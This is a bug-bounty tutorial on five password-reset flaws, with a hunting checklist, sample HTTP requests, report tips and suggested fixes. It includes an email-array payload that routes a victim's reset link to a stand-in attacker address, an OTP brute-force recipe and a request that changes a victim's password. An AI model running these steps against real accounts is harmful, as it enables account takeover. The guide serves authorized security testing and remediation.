# Top 5 Password Reset Bugs

Password reset is the most attacked auth flow because it must work *without* a session. These five flaws — referrer token leak, email-array injection, OTP brute force, unauthorized password change, and response manipulation — are the repeatedly-disclosed winners compiled from writeups and disclosed reports. Each one, exploited against a victim account, is a direct Account Takeover (P1/P2).

Token *expiry/invalidation* bugs live in `Broken_Auth_And_Session_Management/Session_based_bugs.md`; email-parameter pollution variants in `Account_Takeover_By_Password_Reset_Functionality.md`.

## Hunting Checklist

1. Request a reset for your own account; click the emailed link but **do not complete** it — click an external site from the page and check `Referer` for the token (Bug 1).
2. Tamper with the request endpoint's email field: array form, extra `email=` params, case/whitespace variants (Bug 2 + pollution list in the ATO file).
3. If the flow ends in an OTP step, send it to Intruder (000000–999999) and watch for rate limits (Bug 3).
4. Take the *final* change-password/submit request and swap `email`/`user_id`/`token` for a victim's while keeping your auth — check authorization on the endpoint (Bug 4).
5. On every failure in the flow (wrong token, expired token, wrong OTP), check whether client behavior is driven by response body/status — try rewriting it (Bug 5).

## Test Cases & Examples

### 1. Password Reset Token Leak Via Referrer
The `Referer` header sends the URL of the page you came from — including query strings with the token — to every third-party resource the reset page loads.
1. Request a password reset to your email.
2. Open the reset link but don't change the password.
3. Click any third-party link/asset on that page (Facebook, Twitter widget, etc.).
4. In Burp, inspect the outgoing request: if the token rides along:
```http
GET /like.php?u=... HTTP/1.1
Host: facebook.com
Referer: https://target.com/reset?token=2b08cb71-1234-5678-9abc-def012345678
```
then a victim who clicks an external site straight from the reset page leaks their token → ATO. (See `Password_Reset_Token_Leakage.md` for analytics-domain variants.)

### 2. Array Injection in the Email Parameter
When the backend reads *all* values of the email field and mails every one:
```http
POST /api/v1/password_reset HTTP/1.1
Host: example.com
Content-Type: application/json

{"email_address":"victim@gmail.com"}
```
```http
POST /api/v1/password_reset HTTP/1.1
Host: example.com
Content-Type: application/json

{"email_address":["victim@breadcrumb.com","attacker@evil.com"]}
```
The link lands in both inboxes → attacker uses it → full ATO. Non-JSON siblings (`email=victim@gmail.com&email=attacker@gmail.com`, pipes, CRLF) are listed in `Account_Takeover_By_Password_Reset_Functionality.md`.

### 3. Brute-Forcing the Reset OTP
Many programs triage "no rate limit" as acceptable risk, so brute force is still the practical win — changing user data lets you attack *any* account.
1. Start the reset for a target account; reach the OTP step.
2. Send the verification request to Intruder, mark the OTP field.
3. Numbers payload `000000–999999` (match digit length).
```http
POST /api/reset/verify HTTP/1.1
Host: target.com
Content-Type: application/json

{"otp":"000000"}
```
4. Hunt the outlier response (length/status) = valid OTP.

### 4. ATO via Change-Password API Parameter Manipulation
The endpoint trusts the request's identity parameters instead of the session:
1. Log in as the attacker; go to change password.
2. Intercept, send to Repeater, swap the email:
```http
POST /api/changepass HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=<attacker_session>

{"email":"victim@email.tld","password":"12345678"}
```
3. Success = attacker-set password on the victim account → ATO.

### 5. Response Manipulation: Replace the Bad Response With a Good One
When the *browser* decides auth from what the server "said":
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"message":"unsuccessful","statusCode":403,"errorDescription":"Unsuccessful"}
```
Edit it in-proxy to:
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"message":"success","statusCode":200,"errorDescription":"Success"}
```
If the app advances to the new-password step, verification is bypassed.

## Tools & Resources

- Burp Suite: Proxy (response interception), Repeater, Intruder (Numbers payload), Match-and-Replace for hands-free rewriting.
- [Hunting for Bugs in Password Reset Feature – Sm4rty](https://sm4rty.medium.com/hunting-for-bugs-in-password-reset-feature-2021-3def1b391bef)
- [10 Password Reset Flaws – Anurag Srivastava](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
- In-folder: `Password_Reset_Flaws_by_Sm4rty.md`, `Password_Reset_Token_Leakage.md`, `Account_Takeover_By_Password_Reset_Functionality.md`.

## Report Tips

- Every one of these five must be demonstrated against a **second, victim-controlled account** — resetting your own is a policy note, not a vuln.
- Quantify brute force: "1M possible codes, X req/sec sustained, no lockout ⇒ average N minutes to compromise".
- For leaks (#1 and folder variants), name the exact third-party domain that received the token so triage can verify the exposure.

### Suggested Fixes (for triage)
- Proper rate limiting + lockout on OTP/token steps; high-entropy single-use tokens; server-side authorization on all reset/change-password APIs; `Referrer-Policy: no-referrer` (or `same-origin`) on token-bearing pages; validate email params as scalars.

## Credits

- Compiled by [Sm4rty](https://twitter.com/Sm4rty_) from Twitter/writeups/disclosed reports; expanded edition restructured for HowToHunt.
